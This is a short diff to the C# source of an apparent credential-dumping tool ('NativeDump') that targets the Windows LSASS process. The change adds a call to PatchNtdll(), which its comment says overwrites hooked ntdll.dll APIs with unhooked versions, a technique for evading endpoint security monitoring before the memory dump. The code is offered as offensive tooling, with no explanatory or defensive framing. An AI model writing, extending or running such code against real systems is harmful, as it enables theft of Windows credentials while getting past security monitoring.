@@ -4,6 +4,8 @@ using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using static NativeDump.Win32;
 using static NativeDump.CreateFile;
+using static NativeDump.Overwrite;
+
 
 namespace NativeDump
 {
@@ -151,6 +153,9 @@ namespace NativeDump
 
         static void Main(string[] args)
         {
+            // Overwrite ntdll.dll hooked APIs with unhooked versions
+            PatchNtdll();
+
             // Get process name
             string procname = "lsass";
             
